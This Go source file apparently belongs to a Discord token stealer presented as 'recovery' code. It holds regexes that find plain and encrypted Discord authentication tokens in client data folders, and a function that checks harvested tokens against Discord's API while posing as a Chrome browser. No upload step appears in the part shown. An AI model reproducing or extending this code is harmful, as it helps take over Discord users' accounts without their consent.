package discord

import (
	"net/http"
	"regexp"
	"time"

	"recovery/recovery/types"
)

var TokenRe = regexp.MustCompile(`[\w-]{24,30}\.[\w-]{6}\.[\w-]{27,42}|mfa\.[\w-]{80,95}`)
var EncRe = regexp.MustCompile(`dQw4w9WgXcQ:[^"\\]+`)
var HTTPClient = &http.Client{Timeout: 8 * time.Second}

type DiscordApp struct {
	Name string
	Dir  string
}

func CheckToken(token string) bool {
	req, err := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", token)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
	resp, err := HTTPClient.Do(req)
	if err != nil {
		return false
	}
	resp.Body.Close()
	return resp.StatusCode == 200
}

type TokenResult = types.DiscordTokenResult
